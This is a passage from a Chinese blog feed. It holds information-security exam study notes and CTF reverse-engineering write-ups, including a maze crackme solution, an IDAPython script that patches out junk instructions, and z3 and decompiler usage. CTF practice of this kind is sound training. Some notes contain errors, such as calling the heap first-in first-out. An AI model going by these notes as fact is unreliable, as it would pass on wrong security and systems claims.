title="模糊分不清"></a>模糊分不清</h1><ol><li>RADIUS没有完备功能：基于UDP的传输、<strong>简单</strong>的丢包机制、没有关于重传的规定和集中式审计服务</li><li>分布式访问控制方法：单点登录、<strong>Kerberos协议</strong>、SESAME</li><li>集中式AAA管理协议包括a.拨号用户远程认证服务RADIUS、b.终端访问控制器访问控制系统TACACS和Diameter</li><li>Kerberos协议，<strong>对称加密机制</strong>，支持<strong>单点登录，</strong>支持<strong>双向身份认证</strong>，<strong>非集中访问</strong>控制方法。</li><li>Kerberos协议设计核心：在用户验证过程中引入一个可信的第三方》。..无需<strong>主机地址信任，不需要认证</strong></li><li><strong>文件系统安全</strong>是UNIX&#x2F;Linux系统安全的核心，文件是存储在<strong>外存</strong>上具有标识名的一组相关<strong>字符流或记录</strong>的集合，用户数据的集合是文件，目录也是文件，文件系统在安装操作系统<strong>之前</strong>创建</li><li><strong>shellcode</strong>：在缓冲区溢出攻击中，被植入的一段用以获得执行权限的代码</li><li>信息安全五个基本属性：<strong>完整性</strong>、机密性、可用性、可控性、不可否认性</li><li>信息安全保障工作：确定安全需求、设计和实施安全方案、进行<strong>信息安全评测</strong>、实施信息安全监控与维护</li><li>ISO 13335标准<strong>首次</strong>给出的关于IT安全的6个方面的含义：机密性、完整性、可用性、审计性、认证性、可靠性</li><li><strong>1996，</strong>国际标准ISO 15408的标准<strong>（CC）信息技术安全评价通用标准</strong>   <em>信息技术安全评估标准（ITSEC）*<em>GB&#x2F;T18336</em></em></li><li>堆是先进先出，往高地址增长，从低地址向高地址增长；栈是后进先出，往低地址增长，从高地址向地址增长。</li><li>数据库事务均以<strong>BEGIN TRANSACTION</strong>语句显式开始，<strong>COMMIT</strong>和<strong>ROLLBACK</strong>语句显式结束.</li><li>数据库用户权限的两个要素：<strong>数据库对象</strong>和操作类型</li><li>数据库新用户三权限：DBA、RESOURCE、CONNECT</li><li>在CREATE TABLE语句中使用<strong>DEFAULT</strong>子句，是定义默认值首选的方法</li><li>&#x2F;bin用户命令的可执行文件（二进制文件） &#x2F;dev（特殊设备）&#x2F;etc（系统执行文件、配置文件、管理文件，Red Hat Liunx中非二进制配置文件保留）&#x2F;lib（引导系统以及root文件系统中运行命令所需的共享库文件）</li><li>显式地执行自陷指令</li></ol><h1 id="TCP数据包头标志位"><a href="#TCP数据包头标志位" class="headerlink" title="TCP数据包头标志位"></a>TCP数据包头标志位</h1><p>RST：出现差错，必须释放TCP连接重新建立应用层</p><p>URG：紧急指针有效</p><p>PSH：请求接收端主机尽快将数据包交付应用层</p><p>FIN：释放TCP连接</p><p>ACK：确认序号字段有效</p><p>SYN：建立一个同步连接</p><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>ESP-&gt;安全载荷封装</p><p>AH-&gt;认证协议头</p><p>ISAKMP：两台配置了IPSec协议的windows计算机进行IPSec初始链接，通过Wireshark嗅探的前面10个数据包是ISAKMP协议的数据包</p><p>ICMP-&gt;ping命令</p><h1 id="全错"><a href="#全错" class="headerlink" title="全错"></a>全错</h1><ol><li>风险评估：<strong>自评估</strong>、<strong>检查</strong>评估（风险评估分为自评估和检查评估）</li><li>风险评估主要依赖因素：<strong>灾难恢复策略</strong>no× 所采用的系统环境、使用信息的商业目的、商业信息和系统的性质yes√</li><li>信息安全管理的基本技术要求设计五个方面：<strong>物理安全、</strong>网络安全、主机安全、应用安全和数据安全</li><li>审核最大化，体系审核过程影响最小的<strong>必须</strong>选项-&gt;<strong>组织机构要对审核过程本身</strong>进行<strong>安全控制</strong></li><li>利用网络服务程序的漏洞进行传播：<strong>局域网传播</strong></li><li>进行栈溢出漏洞利用时，不属于漏洞利用数据项的是-&gt;<strong>exploit</strong></li><li>漏洞利用的核心是利用程序漏洞去执行<strong>shellcode</strong>以便劫持进程的控制权</li><li>windows系统进程管理工具：任务管理器、Msinfo32、DOS命令行yes√ <strong>本地安全策略no×</strong></li><li>传送会话或文件密钥进行加密时，采用的密钥是：<strong>密钥加密密钥</strong>  会话密钥№×</li><li>配置IPSec支持的身份验证方法不包括<strong>会话密钥</strong></li><li>验证所收到的<strong>消息</strong>确实来自真正发送方未篡改的过程：<strong>消息认证</strong></li><li>验证数字证书的真实性：<strong>验证证书中证书<strong><strong>认证机构的数字签名</strong></strong>来实现</strong></li><li>SSL中记录协议的作用：完成<strong>传输格式</strong>的定义</li><li>不属于主流捆绑：<strong>网站挂马no×</strong>   多文件捆绑、资源融合捆绑、漏洞利用挂马</li><li>不能再视图上完成：在视图上<strong>定义新的表</strong></li><li>中国可信平台使用了<strong>TCM，</strong>TCG可信平台使用的<strong>TPM</strong></li><li><strong>TCG</strong>定义的可信计算平台信任根包括三个根：可信测量根、可信存储根、可信<strong>报告</strong>根</li><li>从硬盘读取boot.ini是NTldr  NT Loader</li><li>守护进程通常周期性的执行某种任务或等待处理发生的事件   <strong>no× 长期运行、自动关闭、少数服务通过实现</strong></li><li>数据库安全错误的是：SQL注入攻击利用的是SQL语法，可以<strong>不受限制的访问数据库×</strong></li><li>数据库安全检测：端口扫描、渗透扫描、内部安全扫描yes√ <strong>入侵检测no×</strong></li><li>数据库渗透测试：漏洞分析、用户名和密码渗透、监听器安全特性分析yes√ <strong>发现数据库服务端口no×</strong></li><li>数据库系统提供两种存取控制机制：<strong>自主</strong>存取控制和<strong>强制</strong>存取控制</li><li>Biba模型作为BLP模型的补充，利用“下读\上写”保证数据完整性</li><li>windows两类用户权限：登录权限 操作权限</li></ol><h1 id="网络端口"><a href="#网络端口" class="headerlink" title="网络端口"></a>网络端口</h1><p>110-&gt;POP3</p><p>25-&gt;SMTP</p><p>23-&gt;TELNET</p><p>21-&gt;FTP</p><h1 id="标准答案"><a href="#标准答案" class="headerlink" title="标准答案"></a>标准答案</h1><ol><li><strong>智能</strong>模糊测试技术：结合了程序理解和模糊测试的测试技术</li><li>会话劫持</li><li>污点传播分析技术</li><li>regedit</li><li>RADIUS 拨号用户远程认证服务</li><li>安全特征</li><li>渗透测试</li><li>证书链的起始端：<strong>信任锚</strong></li><li>信任模型：主要适用于有严格的<strong>层次级别</strong>划分的大型组织机构和行业领域的信任模型</li><li>美国的国家漏洞库：<strong>NVD</strong></li><li>信息安全管理体系的主要内容：信息管理<strong>框架</strong>及其实施、信息<strong>安全管理体系审核</strong>、信息安全管理体系的<strong>认证</strong></li><li>信息安全管理的内容主要包括信息安全<strong>管理体系</strong>、信息安全<strong>风险管理</strong>、信息安全<strong>管理措施</strong></li><li>重要安全管理过程：系统获取、开发和维护、信息安全事件管理与应急响应、业务连续性管理与灾难恢复yes√ <strong>安全资质评审no×</strong></li><li>安全管理方针手册主要内容：信息安全方针的阐述、控制目标与控制方式描述、程序或其引用yes√ <strong>信息管理的流程no×</strong></li><li>信息系统安全：a.<strong>自主</strong>保护级、b.系统审计保护级、c.<strong>安全标记</strong>保护级、d.结构化保护级、e.访问验证保护级</li><li>信息系统的安全保护等级两个定级要素：等级保护对象受到破坏时所侵害的客体；对客体造成侵害的程度</li><li>Msinfo32显示本地计算机硬件、系统组件和软件环境的完整视图，查看系统信息的工具</li></ol><h1 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h1><ol><li>（<strong>公共密钥基础设施</strong>）PKI核心<strong>数字证书****，</strong>用<strong>公钥</strong>密码学技术来实施和提供安全服务的安全基础设施</li><li>数字证书不包含<strong>用户私钥 no×</strong> 用户身份标识、用户的公钥、CA的数字签名 <strong>含有信息的一串数字</strong></li><li><strong>数字签名体制</strong>的两个过程：签名和<strong>验证签名</strong></li><li>数字证书的存储格式标准：X.509最基本的证书存储格式，签名值是<strong>CA</strong>对证书上述内容的数字签名值，其他用户、应用程序或实体需下载<strong>CA根证书</strong>，使用此证书中的<strong>公钥</strong>对证书中的数字签名进行验证</li><li>信息安全技术的核心：<strong>密码技术</strong></li><li>可信计算平台的主要关键技术：<strong>信任根和信任链</strong></li><li>**证书签发机构(CA)**是公共密钥基础设施的核心机构</li><li>**证书注册机构(RA)**是接受客户证书申请并进行审核注册的机构</li><li>身份认证的方法：静态密码、动态口令、USB KEY认证 yes√ <strong>AC证书no×</strong></li></ol><h1 id="🐎你🐎呢"><a href="#🐎你🐎呢" class="headerlink" title="🐎你🐎呢"></a>🐎你🐎呢</h1><ol><li>恶意程序的传播方法：网站挂🐎、诱骗下载、通过移动存储介质传播、通过电子邮件和即时通信软件传播、通过局域网传播 （网络钓鱼<strong>×</strong>）</li><li>rootkit技术的木马是<strong>第五代</strong>木马，<strong>内核隐藏</strong>技术</li></ol><h1 id="密码种类"><a href="#密码种类" class="headerlink" title="密码种类"></a>密码种类</h1><ol><li>对称密码：DES（64）、AES(128)、IDEA</li><li>分组密码：（Feistel网络）DES、IDEA、(sp网络)AES、 （商业）SM4</li><li>序列密码：<strong>RC4</strong>、SEAL</li><li>160位哈希值：<strong>SHA-1</strong>、椭圆曲线密码的p值、ECC参数规模、SHA算法</li><li>MD5是128位</li><li>ElGamal密码-&gt;离散对数；RSA-&gt;大整数因式分解</li><li>非保护信道第一个：Diffie-Hellman</li></ol><h1 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h1><ol><li><p>《可信计算机评估标准》（<strong>TCSEC</strong>，也称为橘皮书）将计算机系统安全划分为：<strong>四</strong>个等级<strong>七</strong>个级别</p></li><li><p>《信息安全等级保护管理办法》信息系统分为：<strong>五</strong>个安全保护等级</p></li><li><p>基于角色的访问控制：用户、角色、<strong>许可</strong></p></li><li><p>信息系统的<em>安全</em>保护：人员、技术、操作</p></li><li></li><li><p>进程与CPU通信是通过<strong>中断</strong>完成的</p></li><li><p>进程是<strong>资源分配</strong>的基本单位</p></li><li><p>线程是独立<strong>运行</strong>和独立<strong>调度</strong>的基本单位，操作系统能够进行<strong>运算调度</strong>的最小单位</p></li><li><p>chmod改变文件权限</p></li><li><p>chown改变文件<strong>拥有权</strong></p></li><li><p>last命令：列出用户所有登录时间和登陆终端地址</p></li><li><p>lastlog命令：列出用户<strong>最后</strong>登录时间和登陆终端地址</p></li><li><p>unix文件系统安全基于i节点中三段关键信息：<strong>文件拥有者、文件所在分组、****模式</strong></p></li><li><p>信任根包括：可信测量根、可信存储根、可信<strong>报告</strong>根</p></li><li><p>栈是先进后出的数据结构，内存增长方向是高-&gt;低</p></li><li><p>堆是先进先出的数据结构，内存增长方向是低-&gt;高</p></li><li><p>缓冲区溢出攻击，用来获得执行权限的代码被称为<strong>shellcode</strong>代码</p></li><li><p><strong>保护环：</strong>操作系统使用确保进程不会彼此造成负面影响</p></li><li><p>服务通过<strong>inetd</strong>进程或启动脚本启动</p></li><li><p>运行程序使用的是<strong>bash</strong>命令</p></li><li><p>审计<strong>audit</strong></p></li><li><p>自主访问控制：<strong>DAC</strong></p></li><li><p>强制访问控制：<strong>MAC</strong></p></li><li><p>访问控制类型：预防性、纠正性、探查性yes√ <strong>检验性no×</strong></p></li><li><p>现实方法访问控制：行政性、逻辑\技术性、物理性</p></li><li><p>访问控制依赖三个职责：用户账户管理、操作跟踪、访问权利和许可权的管理</p></li><li><p>程序分配内存地址随机化分布：<strong>ASLR</strong></p></li><li><p>跨站请求伪造CRSF  <strong>客户端</strong>请求</p></li><li><p>跨站<strong>脚本攻击XSS</strong> </p></li><li><p>存储型XSS又称为<strong>持久型</strong>跨站脚本攻击</p></li><li><p>Dos攻击 TCP协议：a.本身缺陷：SYN-Flood ACK-Flood b.全连接发起攻击</p></li><li><p>SQL攻击利用<strong>服务器端漏洞</strong>进行攻击</p></li><li><p>信息技术的产生和发展经历三阶段：电讯技术的发明、计算机技术的发展、互联网的使用</p></li><li><p>网络层协议：RIP</p></li><li><p>应用层协议：HTTP\DNS\SSH</p></li><li><p>基于矩阵的行的访问控制信息表示的是<strong>访问能力表（主体）</strong></p></li><li><p>基于矩阵的列的访问控制信息表示的是<strong>访问控制表（客体）</strong></p></li><li><p>A类IP地址范围：0.0.0.0~127.255.255.255</p><p>B类IP地址范围：128.0.0.0~191.255.255.255</p><p>C类IP地址范围：192.0.0.0~223.255.255.255</p><p>D类IP地址范围：224.0.0.0~239.255.255.255</p></li></ol><h1 id="USB-Key身份认证（加密狗）"><a href="#USB-Key身份认证（加密狗）" class="headerlink" title="USB Key身份认证（加密狗）"></a>USB Key身份认证（加密狗）</h1><p>USB接口的硬件设备，内置单片机或智能卡芯片，可以存储用户的密钥或数字证书  </p><p>利用Usbkey内置的密码算法实现对用户身份的认证。  .</p><p> 基于USB Key身份认证系统主要有两种应用模式：一是基于冲击&#x2F;响应(挑战&#x2F;应答)的认证模式，二是基于PKI体系的认证模式，运用在电子政务、网上银行。  </p><p>PKI体系（数字证书种类）：</p><p>PKI 是 Public Key Infrastructure 的缩写，中文叫做公开密钥基础设施，也就是利用公开密钥机制建立起来的基础设施。  <strong>目的是为了管理密钥和证书。</strong></p><p>PKI 是 Public Key Infrastructure 的缩写，其主要功能是绑定证书持有者的身份和相关的密钥对（通过为公钥及相关的用户身份信息签发数字证书），为用户提供方便的证书申请、证书作废、证书获取、证书状态查询的途径，并利用数字证书及相关的各种服务（证书发布，黑名单发布，时间戳服务等）实现通信中各实体的身份认证、完整性、抗抵赖性和保密性。</p><p>PKI 既不是一个协议，也不是一个软件，它是一个标准，在这个标准之下发展出的为了实现安全基础服务目的的技术统称为 PKI。  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="have_deal" scheme="https://juana-2u.github.io/tags/have-deal/"/>
    
  </entry>
  
  <entry>
    <title>刷题记录</title>
    <link href="https://juana-2u.github.io/2023/09/13/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://juana-2u.github.io/2023/09/13/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2023-09-13T13:29:43.000Z</published>
    <updated>2023-10-14T03:43:16.176Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="NKCTF20230318"><a href="#NKCTF20230318" class="headerlink" title="NKCTF20230318"></a>NKCTF20230318</h1><p><strong>PKMF</strong><br>题目描述：flag格式为nkctf{xxx}，flag全小写字母，中间的xxx为nkctf文件中写入的十六进制内容<br>直接进入主函数查看，这是简单整理后的主函数的样子，标上了一些比较显眼的变量和一些注释。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1680016194354-5acf3de7-44a7-4845-bc70-9dc959b203db.png"                      alt="1680016194354-5acf3de7-44a7-4845-bc70-9dc959b203db"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1680016222684-73dc3bc6-fa4f-4274-84de-12e34ac7e8b3.png"                      alt="1680016222684-73dc3bc6-fa4f-4274-84de-12e34ac7e8b3"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1680016248582-086abeb8-e51c-4f93-8ad1-32b37b3b9d27.png"                      alt="1680016248582-086abeb8-e51c-4f93-8ad1-32b37b3b9d27"                ></p><p>通过大体浏览后知道最后的“Congratulations! you found it!\n”是我们需要的最终结果，所以前面不能使程序退出。<br>ReadFile函数是从文件中读出数据，通过if语句可知，one_read_5的值只能是5，否则就会返回“Wrong”并且退出程序。同理可知下面的key_nkman的值只能是key_yilai数组的值，点进去查看是“6E6B6D616E”这样的一串。key_nkman就等于“6E6B6D616E”。<br>继续往下 <code>HEX_0x15 += key_nkman[time++];</code>HEX_0x15是key_nkman数组的和，<code>0x6E 0x6B 0x6D 0x61 0x6E</code>和为0x215，又由于<code>HEX_0x15</code>是char类型，两个字节高位溢出，即<code>HEX_0x15</code>值是0x15<br>再往下是一个迷宫的描述，可以找到迷宫的原来的字符组成拼接一下，用脚本把迷宫的样子画出来<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1680017946667-566df722-3daa-4300-8d18-9f0b55e69d59.png"                      alt="1680017946667-566df722-3daa-4300-8d18-9f0b55e69d59"                ></p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> s[] = <span class="string">&quot;******************N...*****...*....***.*****..*...**.*...*****.*****.*.*.**....*..*...*..*....**.*.*..*...***.**...*.*.*******..*****..*......**.*......**.****.**...*****...*K...********************&quot;</span>;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">18</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (s[i * <span class="number">18</span> + j] == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i * <span class="number">18</span> + j] == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; s[i * <span class="number">18</span> + j] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>每一行是18个元素，最后迷宫是长这样的<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1680018030630-5eae6acc-261e-4922-9018-d5031089879d.png"                      alt="1680018030630-5eae6acc-261e-4922-9018-d5031089879d"                ><br>既然知道是迷宫了，可由下面while for双嵌套语句中知道上下左右分别是0（上）1（右）2（下）3（左）<br>while（time&lt;16)得到每四个为一组的迷宫路径是：<code>1122 3322 1223 2211 0111 1101 0000 0101 1211 0111 2223 2330 3323 2211 1112 2333</code><br>在线转获得 <code>0x5A 0xFA 0x6B 0xA5 0x15 0x51 0x00 0x11 0x65 0x15 0xAB 0xBC 0xFB 0xA5 0x56 0xBF  </code><br>再由路径的4进制转为16进制与值为0x15的<code>HEX_0x15</code>进行异或操作。<br>最后可以使用脚本获得后面的flag数值</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x6B</span>,<span class="number">0xA5</span>,<span class="number">0x15</span>,<span class="number">0x51</span>,<span class="number">0x00</span>,<span class="number">0x11</span>,<span class="number">0x65</span>,<span class="number">0x15</span> ,<span class="number">0xAB</span>,<span class="number">0xBC</span>,<span class="number">0xFB</span>,<span class="number">0xA5</span>,<span class="number">0x56</span>,<span class="number">0xBF</span>]</span><br><span class="line">flag= []</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag.<span class="built_in">append</span>(<span class="built_in">hex</span>(enc[i]^<span class="number">0x15</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p>[‘0x4f’, ‘0xef’, ‘0x7e’, ‘0xb0’, ‘0x0’, ‘0x44’, ‘0x15’, ‘0x4’, ‘0x70’, ‘0x0’, ‘0xbe’, ‘0xa9’, ‘0xee’, ‘0xb0’, ‘0x43’, ‘0xaa’]<br>加上上面从文件读取到的<br>flag就是nkctf{056e6b6d616e4fef7eb0004415047000bea9eeb043aa}</p><h2 id="ealier"><a href="#ealier" class="headerlink" title="ealier"></a>ealier</h2><p>运行程序后发现程序没有任何反应，查看发现存在花指令的干扰，所以首先要干的就是去花的工作。<br>先查看到的是call函数的花指令，同一种模式的去花，使用脚本完成。</p><blockquote><p>对应的ida版本对应的api函数不同，所以要注意使用的函数</p></blockquote><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes   <span class="comment">#patch_byte函数的导入模块</span></span><br><span class="line"><span class="keyword">import</span> ida_search  <span class="comment">#ida_search函数的导入模块</span></span><br><span class="line"><span class="keyword">import</span> ida_idc     <span class="comment">#idc.next_head函数的导入模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_nop</span>(<span class="params">addr,endaddr</span>):</span><br><span class="line">    <span class="keyword">while</span> addr&lt;endaddr:</span><br><span class="line">        patch_byte(addr,<span class="number">0x90</span>)</span><br><span class="line">        addr+=<span class="number">1</span></span><br><span class="line">pattern =<span class="string">&quot;33 C0 85 C0 74 03 75 00 E8&quot;</span></span><br><span class="line">cur_addr=<span class="number">0x401000</span></span><br><span class="line">end_addr=<span class="number">0x405000</span></span><br><span class="line"><span class="keyword">while</span> cur_addr&lt;end_addr:</span><br><span class="line">    cur_addr=ida_search.find_binary(cur_addr,end_addr,pattern,<span class="number">0</span>,ida_search.SEARCH_DOWN)</span><br><span class="line">    <span class="comment">##ida_search.find_binary是对应着的7.7版本，（通过ida的报错改得）</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;patch address:&quot;</span>+<span class="built_in">str</span>(cur_addr))</span><br><span class="line">    <span class="keyword">if</span> cur_addr == idc.BADADDR: <span class="comment">#BADADDR无效地址</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        my_nop(cur_addr,cur_addr+<span class="number">9</span>)</span><br><span class="line">    cur_addr=idc.next_head(cur_addr)<span class="comment">#下一个指令的地址</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ida_search.find_binary(cur_addr,end_addr,pattern,0,ida_search.SEARCH_DOWN)<br>五个参数分别是：起始位置、结束位置、</p><ul><li><strong>cur_addr</strong>：起始地址，搜索将从该地址开始。</li><li><strong>end_addr</strong>：结束地址，搜索将在该地址处停止。</li><li><strong>pattern</strong>：要搜索的二进制模式，可以是字节字符串或16进制字符串。例如，**”<strong>\x33\xC0\x85\xC0\x74\x03\x75\x00\xE8</strong>“**或”33 C0 85 C0 74 03 75 00 E8”。</li><li>**0 **默认值为0的参数用来表示标志的开关状态</li><li><strong>ida_search.SEARCH_DOWN</strong>：搜索标志，可以是以下之一或它们的组合：<ul><li><strong>ida_search.SEARCH_DOWN</strong>：向下搜索。</li><li><strong>ida_search.SEARCH_UP</strong>：向上搜索。</li><li><strong>ida_search.SEARCH_NEXT</strong>：搜索下一个匹配项。</li><li><strong>ida_search.SEARCH_CASE</strong>：区分大小写。</li><li><strong>ida_search.SEARCH_REGEX</strong>：启用正则表达式搜索。</li></ul></li></ul></blockquote><h1 id="CTFSHOW-NKCTF-4月四周-20230417"><a href="#CTFSHOW-NKCTF-4月四周-20230417" class="headerlink" title="CTFSHOW-NKCTF-4月四周-20230417"></a>CTFSHOW-NKCTF-4月四周-20230417</h1><h3 id="flag白给"><a href="#flag白给" class="headerlink" title="flag白给"></a>flag白给</h3><p>一道易语言的题目，主要就是UPX_0.89.3xx的脱壳，简单对比一下就出来了</p><h3 id="数学不及格"><a href="#数学不及格" class="headerlink" title="数学不及格"></a>数学不及格</h3><p>分析代码<br>中间只有一个加密函数f，看起来像是斐波那契<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681820255179-fd5b0100-eb51-458c-8b89-7c6245395d96.png"                      alt="image.png"                ><br>直接用爆破脚本 求出v10 v11 v12</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">v10= Real(<span class="string">&#x27;v10&#x27;</span>)</span><br><span class="line">v11 = Real(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">v12 = Real(<span class="string">&#x27;v12&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">s = Solver()</span><br><span class="line"> </span><br><span class="line">s.add(<span class="number">591286729879</span> - v10 == <span class="number">3563142128</span>)</span><br><span class="line">s.add( <span class="number">591286729879</span>- v11 == <span class="number">27692482650</span>)</span><br><span class="line">s.add( <span class="number">591286729879</span> - v12 == <span class="number">367672337</span>)</span><br><span class="line">s.add(<span class="number">58</span>+ v12 + v11 + v10 == <span class="number">19163201824812</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">     result = s.model()</span><br><span class="line">     <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">v1=<span class="built_in">hex</span>(<span class="number">591286729879</span>- <span class="number">0x233F0E151C</span>)</span><br><span class="line">v2=<span class="built_in">hex</span>(<span class="number">591286729879</span>-<span class="number">0x1B45F81A32</span>)</span><br><span class="line">v3=<span class="built_in">hex</span>(<span class="number">591286729879</span>-<span class="number">0x244C071725</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(v1)</span><br><span class="line"><span class="built_in">print</span>(v2)</span><br><span class="line"><span class="built_in">print</span>(v3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#no</span></span><br><span class="line"><span class="comment">#0x666c61677b</span></span><br><span class="line"><span class="comment">#0x6e65776265</span></span><br><span class="line"><span class="comment">#0x655f686572</span></span><br></pre></td></tr></table></figure></div><p>再用16进制的转文本的脚本得到flag</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hex_string =<span class="string">&#x27;666c61677b6e65776265655f686572&#x27;</span></span><br><span class="line">text = <span class="built_in">str</span>(<span class="built_in">bytes</span>.fromhex(hex_string), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(text)  <span class="comment"># 输出 &#x27;Hello World&#x27;</span></span><br></pre></td></tr></table></figure></div><h3 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h3><p>先反编译一下 安装了一个之前没安装好的新工具uncompyle6 </p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o pcat.py pcat.pyc</span><br><span class="line"><span class="comment">##默认文件夹是python下的文件夹 </span></span><br><span class="line"><span class="comment">##-o outfile必须先写，例如有一个pcat.pyc，想反编译输出文件为pcat.py</span></span><br></pre></td></tr></table></figure></div><p>反汇编出来的代码是</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 